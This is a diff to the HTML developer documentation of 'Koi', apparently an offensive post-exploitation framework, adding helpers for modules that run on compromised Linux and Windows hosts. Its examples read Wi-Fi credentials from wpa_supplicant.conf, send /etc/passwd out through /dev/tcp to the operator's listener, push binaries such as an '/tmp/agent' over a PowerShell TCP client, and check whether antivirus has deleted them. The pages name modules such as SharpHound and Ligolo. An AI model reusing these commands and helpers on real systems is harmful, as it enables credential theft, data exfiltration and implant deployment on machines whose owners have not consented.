@@ -687,6 +687,17 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#self_try_execcmd-timeout100-str" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        self._try_exec(cmd, timeout=10.0) -&gt; str
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -733,6 +744,28 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#self_upload_bytesraw-dest-timeout300-on_progressnone-bool" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        self._upload_bytes(raw, dest, timeout=30.0, on_progress=None) -&gt; bool
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#self_dispatch_psps_cmd-none" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        self._dispatch_ps(ps_cmd) -&gt; None
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#spawn_recv_servertimeout-port-collect_fn" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -744,21 +777,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#spawn_send_serverraw_bytes-timeout-on_progressnone-port-thread-errors" class="md-nav__link">
+  <a href="#tcpreceiveserver" class="md-nav__link">
     <span class="md-ellipsis">
       
-        spawn_send_server(raw_bytes, timeout, on_progress=None) -&gt; (port, thread, errors)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#tcpreceiveserver-recommended-for-downloads" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        TCPReceiveServer (recommended for downloads)
+        TCPReceiveServer
       
     </span>
   </a>
@@ -1231,6 +1253,17 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#self_try_execcmd-timeout100-str" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        self._try_exec(cmd, timeout=10.0) -&gt; str
+      
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -1277,6 +1310,28 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#self_upload_bytesraw-dest-timeout300-on_progressnone-bool" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        self._upload_bytes(raw, dest, timeout=30.0, on_progress=None) -&gt; bool
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#self_dispatch_psps_cmd-none" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        self._dispatch_ps(ps_cmd) -&gt; None
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#spawn_recv_servertimeout-port-collect_fn" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1288,21 +1343,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#spawn_send_serverraw_bytes-timeout-on_progressnone-port-thread-errors" class="md-nav__link">
+  <a href="#tcpreceiveserver" class="md-nav__link">
     <span class="md-ellipsis">
       
-        spawn_send_server(raw_bytes, timeout, on_progress=None) -&gt; (port, thread, errors)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#tcpreceiveserver-recommended-for-downloads" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        TCPReceiveServer (recommended for downloads)
+        TCPReceiveServer
       
     </span>
   </a>
@@ -1750,6 +1794,12 @@
 <span class="n">size</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_exec_clean</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;wc -c &lt; </span><span class="si">{</span><span class="n">quoted_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 </code></pre></div>
 <p>Internally it redirects stdout to <code>/dev/tcp/&lt;local_ip&gt;/&lt;port&gt;</code> and collects the bytes on a local socket.</p>
+<h4 id="self_try_execcmd-timeout100-str"><code>self._try_exec(cmd, timeout=10.0) -&gt; str</code></h4>
+<p>Like <code>_exec_clean</code> but silently returns an empty string on any error instead of raising. Useful for optional or best-effort commands where a missing tool or empty output is acceptable.</p>
+<div class="highlight"><pre><span></span><code><span class="n">wpa</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_try_exec</span><span class="p">(</span><span class="s2">&quot;cat /etc/wpa_supplicant/wpa_supplicant.conf&quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">8</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">wpa</span><span class="p">:</span>
+    <span class="c1"># parse credentials</span>
+</code></pre></div>
 <h3 id="windows-helpers">Windows Helpers</h3>
 <h4 id="self_win_queryps_expr-timeout100-str"><code>self._win_query(ps_expr, timeout=10.0) -&gt; str</code></h4>
 <p>Evaluates a PowerShell expression on a <strong>Windows</strong> target and returns its string output. Handles both plain and upgraded (ConPtyShell) sessions transparently:</p>
@@ -1771,41 +1821,37 @@
 <p><strong>Always use <code>_win_query</code> instead of <code>exec</code> on Windows sessions.</strong></p>
 </blockquote>
 <h3 id="file-transfer-helpers">File Transfer Helpers</h3>
-<p>These are not methods of <code>KoiModule</code> directly, but utilities from <code>koi.utils.tcp</code> that module authors use together with <code>exec</code> or <code>_win_query</code>/<code>_send_ps</code> to transfer binary data.</p>
+<p>These helpers are available as <code>self.&lt;method&gt;</code> inside <code>run()</code>.</p>
+<h4 id="self_upload_bytesraw-dest-timeout300-on_progressnone-bool"><code>self._upload_bytes(raw, dest, timeout=30.0, on_progress=None) -&gt; bool</code></h4>
+<p>Transfers <code>raw</code> bytes to <code>dest</code> on the target, handling Linux and Windows automatically. Returns <code>False</code> on TCP error.</p>
+<div class="highlight"><pre><span></span><code><span class="n">bar</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ui</span><span class="o">.</span><span class="n">ProgressBar</span><span class="p">(</span><span class="n">total</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">raw</span><span class="p">))</span>
+<span class="n">ok</span>  <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_upload_bytes</span><span class="p">(</span><span class="n">raw</span><span class="p">,</span> <span class="s2">&quot;/tmp/agent&quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">,</span> <span class="n">on_progress</span><span class="o">=</span><span class="n">bar</span><span class="o">.</span><span class="n">update</span><span class="p">)</span>
+<span class="n">bar</span><span class="o">.</span><span class="n">done</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">()</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">ok</span><span class="p">:</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="s2">&quot;Upload failed.&quot;</span><span class="p">)</span>
+    <span class="k">return</span>
+</code></pre></div>
+<ul>
+<li>On <strong>Linux</strong> it uses <code>/dev/tcp/&lt;ip&gt;/&lt;port&gt;</code> via <code>cat</code>.</li>
+<li>On <strong>Windows</strong> it sends a PowerShell TCP-read command via <code>_dispatch_ps</code>.</li>
+</ul>
+<p>Post-transfer verification (e.g. <code>test -s</code>, <code>Test-Path</code>, <code>chmod +x</code>) is the caller's responsibility.</p>
+<h4 id="self_dispatch_psps_cmd-none"><code>self._dispatch_ps(ps_cmd) -&gt; None</code></h4>
+<p>Sends an arbitrary PowerShell command to the session, routing correctly for both plain and upgraded (ConPtyShell) sessions.</p>
+<div class="highlight"><pre><span></span><code><span class="n">ps</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;Remove-Item -Force &#39;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#39; -ErrorAction SilentlyContinue&quot;</span>
+<span class="bp">self</span><span class="o">.</span><span class="n">_dispatch_ps</span><span class="p">(</span><span class="n">ps</span><span class="p">)</span>
+</code></pre></div>
+<p>Use this when you need to fire a PS command that has no return value and doesn't go through <code>_win_query</code>. Commands sent via <code>_dispatch_ps</code> are logged automatically.</p>
 <h4 id="spawn_recv_servertimeout-port-collect_fn"><code>spawn_recv_server(timeout) -&gt; (port, collect_fn)</code></h4>
-<p>Opens a local TCP listener on a random port and returns:
-- <code>port</code> - the port number to give to the remote side
-- <code>collect_fn</code> - a callable that blocks until the data arrives and returns it as <code>bytes</code></p>
-<p>Used when you want the <strong>remote machine to push data to you</strong> (download).</p>
+<p>Opens a local TCP listener on a random port. Used when you want the <strong>remote machine to push data to you</strong> (download).</p>
 <div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">koi.utils.tcp</span><span class="w"> </span><span class="kn">import</span> <span class="n">spawn_recv_server</span>
 
 <span class="n">port</span><span class="p">,</span> <span class="n">collect</span> <span class="o">=</span> <span class="n">spawn_recv_server</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
 <span class="bp">self</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;cat /etc/passwd &gt; /dev/tcp/</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 <span class="n">data</span> <span class="o">=</span> <span class="n">collect</span><span class="p">()</span>   <span class="c1"># bytes</span>
 </code></pre></div>
-<h4 id="spawn_send_serverraw_bytes-timeout-on_progressnone-port-thread-errors"><code>spawn_send_server(raw_bytes, timeout, on_progress=None) -&gt; (port, thread, errors)</code></h4>
-<p>Opens a local TCP listener and serves <code>raw_bytes</code> to the first client that connects. Returns:
-- <code>port</code> - port to connect to from the remote side
-- <code>thread</code> - the serving thread (join it to wait for completion)
-- <code>errors</code> - list that will contain any exception messages on failure</p>
-<p>Used when you want to <strong>push data to the remote machine</strong> (upload).</p>
-<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">koi.utils.tcp</span><span class="w"> </span><span class="kn">import</span> <span class="n">spawn_send_server</span>
-
-<span class="n">port</span><span class="p">,</span> <span class="n">thread</span><span class="p">,</span> <span class="n">errors</span> <span class="o">=</span> <span class="n">spawn_send_server</span><span class="p">(</span><span class="n">raw</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
-<span class="n">ps_cmd</span> <span class="o">=</span> <span class="p">(</span>
-    <span class="sa">f</span><span class="s2">&quot;$c=New-Object Net.Sockets.TcpClient(&#39;</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s2">&#39;,</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">);&quot;</span>
-    <span class="sa">f</span><span class="s2">&quot;$s=$c.GetStream();&quot;</span>
-    <span class="sa">f</span><span class="s2">&quot;$f=[IO.File]::OpenWrite(&#39;</span><span class="si">{</span><span class="n">dest</span><span class="si">}</span><span class="s2">&#39;);&quot;</span>
-    <span class="sa">f</span><span class="s2">&quot;$b=New-Object byte[] 65536;&quot;</span>
-    <span class="sa">f</span><span class="s2">&quot;while(($n=$s.Read($b,0,$b.Length))-gt 0)</span><span class="se">{{</span><span class="s2">$f.Write($b,0,$n)</span><span class="se">}}</span><span class="s2">;&quot;</span>
-    <span class="sa">f</span><span class="s2">&quot;$f.Close();$c.Close()&quot;</span>
-<span class="p">)</span>
-<span class="bp">self</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ps_cmd</span><span class="p">)</span>
-<span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
-<span class="k">if</span> <span class="n">errors</span><span class="p">:</span>
-    <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Upload failed: </span><span class="si">{</span><span class="n">errors</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
-</code></pre></div>
-<h4 id="tcpreceiveserver-recommended-for-downloads"><code>TCPReceiveServer</code> (recommended for downloads)</h4>
+<h4 id="tcpreceiveserver">TCPReceiveServer</h4>
 <p>A class-based alternative to <code>spawn_recv_server</code> that provides a cleaner interface and built-in progress tracking. Import it from <code>blueprint</code>:</p>
 <div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">koi.modules.blueprint</span><span class="w"> </span><span class="kn">import</span> <span class="n">KoiModule</span><span class="p">,</span> <span class="n">TCPReceiveServer</span>
 </code></pre></div>
@@ -2087,7 +2133,7 @@
 <span class="k">if</span> <span class="n">os_type</span> <span class="o">==</span> <span class="s2">&quot;linux&quot;</span><span class="p">:</span>
     <span class="bp">self</span><span class="o">.</span><span class="n">exec</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;cat </span><span class="si">{</span><span class="n">quoted</span><span class="si">}</span><span class="s2"> &gt; /dev/tcp/</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span>
 <span class="k">else</span><span class="p">:</span>
-    <span class="bp">self</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ps_cmd</span><span class="p">)</span>  <span class="c1"># PowerShell TcpClient write</span>
+    <span class="bp">self</span><span class="o">.</span><span class="n">_dispatch_ps</span><span class="p">(</span><span class="n">ps_cmd</span><span class="p">)</span>  <span class="c1"># PowerShell TcpClient write</span>
 
 <span class="c1"># 3. Collect and write to disk</span>
 <span class="k">try</span><span class="p">:</span>
@@ -2106,33 +2152,26 @@
 <p>All three upload modules follow the same pattern:</p>
 <ol>
 <li>Prepare the binary locally (download from GitHub, extract from zip, etc.)</li>
-<li>Call <code>spawn_send_server(raw, timeout=...)</code> to serve the bytes.</li>
-<li>Send a PowerShell TCP-read command to the target.</li>
-<li>Join the serving thread and verify the file landed with <code>_win_query("(Test-Path )")</code>.</li>
+<li>Call <code>self._upload_bytes(raw, dest, timeout=...)</code> to transfer.</li>
+<li>Verify the file landed with <code>_win_query("(Test-Path ...)")</code> — AV may silently delete it.</li>
 </ol>
-<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">koi.utils.tcp</span><span class="w"> </span><span class="kn">import</span> <span class="n">spawn_send_server</span>
+<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
+    <span class="c1"># ... fetch raw bytes ...</span>
 
-<span class="k">def</span><span class="w"> </span><span class="nf">_upload_bytes</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">raw</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">dest</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
-    <span class="n">local_ip</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_get_local_ip</span><span class="p">()</span>
-    <span class="n">port</span><span class="p">,</span> <span class="n">thread</span><span class="p">,</span> <span class="n">errors</span> <span class="o">=</span> <span class="n">spawn_send_server</span><span class="p">(</span><span class="n">raw</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
+    <span class="n">ok</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_upload_bytes</span><span class="p">(</span><span class="n">raw</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">ok</span><span class="p">:</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="s2">&quot;Transfer failed.&quot;</span><span class="p">)</span>
+        <span class="k">return</span>
 
-    <span class="n">ps_cmd</span> <span class="o">=</span> <span class="p">(</span>
-        <span class="sa">f</span><span class="s2">&quot;$c=New-Object Net.Sockets.TcpClient(&#39;</span><span class="si">{</span><span class="n">local_ip</span><span class="si">}</span><span class="s2">&#39;,</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">);&quot;</span>
-        <span class="sa">f</span><span class="s2">&quot;$s=$c.GetStream();&quot;</span>
-        <span class="sa">f</span><span class="s2">&quot;$f=[IO.File]::OpenWrite(&#39;</span><span class="si">{</span><span class="n">dest</span><span class="si">}</span><span class="s2">&#39;);&quot;</span>
-        <span class="sa">f</span><span class="s2">&quot;$b=New-Object byte[] 65536;&quot;</span>
-        <span class="sa">f</span><span class="s2">&quot;while(($n=$s.Read($b,0,$b.Length))-gt 0)</span><span class="se">{{</span><span class="s2">$f.Write($b,0,$n)</span><span class="se">}}</span><span class="s2">;&quot;</span>
-        <span class="sa">f</span><span class="s2">&quot;$f.Close();$c.Close()&quot;</span>
-    <span class="p">)</span>
-    <span class="bp">self</span><span class="o">.</span><span class="n">_send_ps</span><span class="p">(</span><span class="n">ps_cmd</span><span class="p">)</span>
-    <span class="n">thread</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
-
-    <span class="k">if</span> <span class="n">errors</span><span class="p">:</span>
-        <span class="k">return</span> <span class="kc">False</span>
-
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">1.0</span><span class="p">)</span>   <span class="c1"># give AV time to act before checking</span>
     <span class="n">check</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_win_query</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;(Test-Path &#39;</span><span class="si">{</span><span class="n">dest</span><span class="si">}</span><span class="s2">&#39;).ToString()&quot;</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">check</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&quot;true&quot;</span>
+    <span class="k">if</span> <span class="n">check</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">&quot;true&quot;</span><span class="p">:</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">err</span><span class="p">(</span><span class="s2">&quot;File not present after upload, likely removed by AV.&quot;</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="bp">self</span><span class="o">.</span><span class="n">ok</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Uploaded to </span><span class="si">{</span><span class="n">dest</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 </code></pre></div>
+<p><code>_upload_bytes</code> handles the TCP server, the PowerShell command, and upgraded vs plain session routing automatically.</p>
 <hr />
 <h2 id="common-patterns">Common Patterns</h2>
 <h3 id="side-channel-tcp-transfer">Side-channel TCP transfer</h3>
@@ -2151,19 +2190,11 @@
     <span class="c1"># Inline sentinel is fine</span>
     <span class="o">...</span>
 </code></pre></div>
-<p><code>_win_query</code> handles this transparently - you don't need the check there. You do need it when sending raw PowerShell that doesn't go through <code>_win_query</code>, for example when triggering a TCP upload:</p>
-<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">_send_ps</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ps_cmd</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
-    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">upgraded</span><span class="p">:</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">((</span><span class="n">ps_cmd</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">encoding</span><span class="p">))</span>
-        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.3</span><span class="p">)</span>
-        <span class="n">r</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">select</span><span class="o">.</span><span class="n">select</span><span class="p">([</span><span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">conn</span><span class="p">],</span> <span class="p">[],</span> <span class="p">[],</span> <span class="mf">1.0</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">r</span><span class="p">:</span>
-            <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>   <span class="c1"># drain any echo</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ps_cmd</span><span class="p">)</span>
+<p><code>_win_query</code> handles this transparently - you don't need the check there. For sending arbitrary PS commands without a return value, use <code>_dispatch_ps</code> — it routes correctly for both upgraded and plain sessions automatically:</p>
+<div class="highlight"><pre><span></span><code><span class="bp">self</span><span class="o">.</span><span class="n">_dispatch_ps</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Remove-Item -Force &#39;</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2">&#39; -ErrorAction SilentlyContinue&quot;</span><span class="p">)</span>
 </code></pre></div>
 <h3 id="handling-both-upgraded-and-plain-sessions-on-windows">Handling both upgraded and plain sessions on Windows</h3>
-<p>A portable <code>_send_ps</code> helper (as used in <code>sharphound.py</code>, <code>populate_win.py</code>, <code>ligolo.py</code>) is the cleanest way to deal with the two cases. Copy it into your module or factor it into a shared utility.</p>
+<p>Use <code>_dispatch_ps</code> for fire-and-forget PS commands, and <code>_upload_bytes</code> for file transfers. Both are in the base class and handle the upgraded/plain split internally — you don't need to implement it yourself.</p>
 <hr />
 <h2 id="error-handling-best-practices">Error Handling Best Practices</h2>
 <ul>
@@ -2196,7 +2227,9 @@
 <li>[ ] <code>name</code>, <code>description</code>, and <code>platform</code> are set correctly</li>
 <li>[ ] <code>run()</code> is implemented</li>
 <li>[ ] <code>exec()</code> is only called on Linux sessions; <code>_win_query()</code> for Windows</li>
-<li>[ ] Upgraded-session compatibility is handled (either via <code>_win_query</code> or a <code>_send_ps</code> helper)</li>
+<li>[ ] File uploads use <code>self._upload_bytes()</code> — do not reimplement the TCP transfer manually</li>
+<li>[ ] Arbitrary PS commands use <code>self._dispatch_ps()</code> — do not call <code>session.conn.sendall()</code> directly</li>
+<li>[ ] Upgraded-session compatibility is handled automatically via <code>_win_query</code>, <code>_upload_bytes</code>, or <code>_dispatch_ps</code></li>
 </ul>
 
 
